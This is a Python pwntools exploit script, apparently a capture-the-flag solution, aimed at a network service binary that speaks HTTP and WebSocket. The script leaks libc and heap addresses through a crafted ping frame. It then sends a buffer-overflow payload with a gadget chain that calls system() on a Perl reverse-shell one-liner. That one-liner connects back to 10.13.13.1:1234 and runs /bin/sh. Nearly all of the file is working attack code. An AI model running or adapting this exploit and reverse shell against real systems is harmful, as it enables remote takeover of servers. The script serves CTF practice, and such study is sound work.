```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ vagd template ../attachments/share/hamal localhost 8080 -o __main__.py
from pwn import *


GOFF   = 0x555555554000                               # GDB default base address
IP = 'localhost' if len(sys.argv) < 2 else sys.argv[1]
PORT = 8080 if len(sys.argv) < 3 else int(sys.argv[2])
BINARY = '/bin/true'                                  # PATH to local binary
ARGS   = []                                           # ARGS supplied to binary
ENV    = {}                                           # ENV supplied to binary
BOX    = 'ubuntu:noble'                               # Docker box image

# GDB SCRIPT, executed at start of GDB session (e.g. set breakpoints here)
GDB    = f"""
set follow-fork-mode parent

c"""

context.binary = exe = ELF(BINARY, checksec=False)    # binary
context.aslr = False                                  # ASLR enabled (only GDB)

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)


# setup vagd vm
vm = None
def setup():
  global vm
  if args.REMOTE or args.LOCAL:
    return None

  try:
    # only load vagd if needed
    from vagd import Dogd, Qegd, Box
  except ModuleNotFoundError:
    log.error('Failed to import vagd, run LOCAL/REMOTE or install it')
  if not vm:
    vm = Dogd(BINARY, image=BOX, symbols=True, ex=True, fast=True)  # Docker
    # vm = Qegd(BINARY, img=Box.QEMU_UBUNTU, symbols=True, ex=True, fast=True)  # Qemu
  if vm.is_new:
    # additional setup here
    log.info('new vagd instance')

  return vm


# get target (pwnlib.tubes.tube)
def get_target(**kw):
  if args.REMOTE:
    # context.log_level = 'debug'
    return remote(IP, PORT)

  if args.LOCAL:
    if args.GDB:
      return gdb.debug([BINARY] + ARGS, env=ENV, gdbscript=GDB, **kw)
    return process([BINARY] + ARGS, env=ENV, **kw)

  return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)


vm = setup()

#===========================================================
#                   EXPLOIT STARTS HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Comment:    GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0

libc = ELF('./libs/libc.so.6', checksec=False)

PING = '/api/ping'
ECHO = '/api/echo'
BOOST = '/api/boost'
STATUS = '/api/status'

def build_header(path, method, data=None, cookie=None, data_len=None, headers=None):
  if headers is None:
    headers = list()

  if data and data_len is None:
    data_len = len(data)

  if data_len is not None:
    headers += [f'Content-Length: {data_len}\r\n'.encode()]

  if cookie is not None:
    headers += [f'Cookie: {cookie}\r\n'.encode()]

  return flat(
      byt(method), b' ', byt(path), b' HTTP/1.1\r\n',
      b'Host: ', f'{IP}:{PORT}\r\n'.encode(),
      headers,
      b'\r\n'
    )

def build_upgrade_header(path, method, data=None, data_len=None):
  headers = [
    b'Upgrade: websocket\r\n',
    b'Connection: Upgrade\r\n',
    b'Sec-WebSocket-Version: 111\r\n',
    f'Sec-WebSocket-Key: {b64e(p64(0x6fe1be2))}\r\n'.encode(),
  ]
  return build_header(path, method, data=data, data_len=data_len, headers=headers)

def recv_response(t=None) -> bytes:
  headers = list()
  while (out := rl()[:-2]) != b'':
    headers.append(out)

  content_length = headers[2]
  assert content_length.startswith(b'Content-Length: ')
  length = int(content_length.split(b' ')[1])

  return rcv(length, t)

def ping():
  data = b'ping'
  se(build_header(PING, 'POST', data))
  se(data)
  resp = recv_response()
  linfo('resp: %s', resp)

def ws_send(data, opcode=1, fin=True, masking_key=False):
    if 0x3 <= opcode <= 0x7 or 0xB <= opcode:
        raise ValueError('Invalid opcode')
    header = struct.pack('!B', ((bool(fin) << 7) | opcode))
    mask_bit = (1 << 7) if masking_key else 0
    length = len(data)
    if length < 126:
        header += struct.pack('!B', (mask_bit|length))
    elif length < (1 << 16):
        header += struct.pack('!B', (mask_bit|126)) + struct.pack('!H', length)
    elif length < (1 << 63):
        header += struct.pack('!B', (mask_bit|127)) + struct.pack('!Q', length)
    else:
        raise ValueError('Data too large')

    if mask_bit:
        # mask data
        header += masking_key
        data = bytearray(data)
        for i in range(0, length):
            data[i] ^= masking_key[i % 4]

    return header + data

def ws_recv(t=None):
    first_byte = rcv(1, t)
    second_byte = rcv(1, t)

    fin = (first_byte[0] >> 7) & 1
    opcode = first_byte[0] & 0x0F
    mask = (second_byte[0] >> 7) & 1
    payload_length = second_byte[0] & 0x7F

    if payload_length == 126:
        payload_length = struct.unpack('!H', rcv(2, t))[0]
    elif payload_length == 127:
        payload_length = struct.unpack('!Q', rcv(8, t))[0]

    masking_key = b''
    if mask:
        masking_key = rcv(4, t)

    payload_data = rcv(payload_length, t)

    if mask:
        payload_data = bytearray(payload_data)
        for i in range(payload_length):
            payload_data[i] ^= masking_key[i % 4]
        payload_data = bytes(payload_data)

    return fin, opcode, payload_data

context.newline = b'\r\n'

# lock all but on process
tl = list()
for i in range(3): 
  tl.append(get_target())
  se(build_upgrade_header(STATUS, 'GET'), tl[-1])

t = get_target()
se(build_upgrade_header(STATUS, 'GET'))
ru('\r\n\r\n')

REV_IP = "10.13.13.1"
REV_PORT = 1234
CMD = """nohup perl -e 'use Socket;$i="REPLACE_ME_IP";$p=REPLACE_ME_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){if(!defined(fileno(STDIN))||!defined(fileno(STDOUT))||!defined(fileno(STDERR))){open(STDIN,">/dev/null");open(STDOUT,">/dev/null");open(STDERR,">/dev/null");}open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'&""".replace("REPLACE_ME_IP", REV_IP).replace("REPLACE_ME_PORT", str(REV_PORT))

payload = flat({
  'qaab': CMD.encode() + b'\0'
}, length=0x410)

data = ws_send(payload, opcode=9)
se(data)
rcvd = ws_recv()
se(data[:-0x410])
t.shutdown('send')
_, _, leak = ws_recv()
libc.address = u64(leak[0x00:0x08]) - 0x1b1010
HEAP = u64(leak[0x10:0x18]) - 0x35f20

lhex(HEAP, 'heap')
lhex(libc.address, 'libc')
cl(t)

t = get_target()

# mov x0, x25 ; blr x20
SETUP = libc.address + 0x11dc38

bof = flat({
  0: b'\0',
  'caaa': SETUP,
  'gaaa': libc.sym.system, # x20 
  'qaaa': HEAP + 0x700, # x25
  'baab': libc.address + 0x1b1c00,
  0x200: b''
})

se(build_upgrade_header(BOOST, 'GET'))
ru('\r\n\r\n')
se(bof + b'\n')

t.interactive() # or it()
```
